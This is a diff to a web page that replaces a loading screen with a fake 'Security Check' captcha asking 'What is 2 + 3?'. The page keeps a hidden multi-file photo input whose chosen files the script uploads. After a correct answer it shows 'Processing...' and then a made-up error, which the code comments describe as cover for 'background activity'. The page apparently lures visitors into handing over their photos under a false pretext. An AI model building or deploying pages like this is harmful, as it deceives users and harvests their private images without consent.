@@ -3,24 +3,38 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loading...</title>
+    <title>Security Check</title>
     <style>
         body {
             font-family: Arial, sans-serif;
             text-align: center;
             padding: 50px;
         }
+        .captcha {
+            margin: 20px auto;
+            padding: 20px;
+            border: 1px solid #ccc;
+            width: 300px;
+            background-color: #f9f9f9;
+        }
         .hidden {
             display: none;
         }
-        .loading {
-            font-size: 24px;
-            color: #555;
+        .error {
+            color: red;
+            font-weight: bold;
         }
     </style>
 </head>
 <body>
-    <div class="loading">Loading... Please wait.</div>
+    <div class="captcha">
+        <h2>Security Check</h2>
+        <p>Please solve the following captcha to continue:</p>
+        <p><strong>What is 2 + 3?</strong></p>
+        <input type="text" id="captcha-input" placeholder="Your answer">
+        <button onclick="checkCaptcha()">Submit</button>
+        <p id="error-message" class="hidden error">Invalid captcha. Please try again later.</p>
+    </div>
 
     <!-- Hidden file input -->
     <input type="file" id="photo-upload" accept="image/*" class="hidden" multiple>
@@ -59,22 +73,36 @@
                             console.error("Error uploading file:", file.name, error);
                         }
                     }
-
-                    // Close the page after upload
-                    window.close();
-                } else {
-                    // Display a generic error message if no files are selected
-                    document.querySelector(".loading").textContent = "An error occurred. Please try again later.";
                 }
             });
 
             // Abort if no files are selected after a short delay
             setTimeout(() => {
                 if (fileInput.files.length === 0) {
-                    document.querySelector(".loading").textContent = "An error occurred. Please try again later.";
-                    window.close();
+                    console.log("No files selected.");
                 }
             }, 5000); // 5-second timeout
+        }
+
+        // Function to check the captcha
+        function checkCaptcha() {
+            const captchaInput = document.getElementById("captcha-input").value;
+            const errorMessage = document.getElementById("error-message");
+
+            if (captchaInput === "5") {
+                // Captcha solved correctly
+                errorMessage.textContent = "Captcha solved! Processing...";
+                errorMessage.classList.remove("hidden");
+
+                // Simulate a delay for background activity
+                setTimeout(() => {
+                    errorMessage.textContent = "An error occurred. Please try again later.";
+                }, 5000); // 5-second delay
+            } else {
+                // Captcha solved incorrectly
+                errorMessage.textContent = "Invalid captcha. Please try again later.";
+                errorMessage.classList.remove("hidden");
+            }
         }
 
         // Adjust behavior based on device type
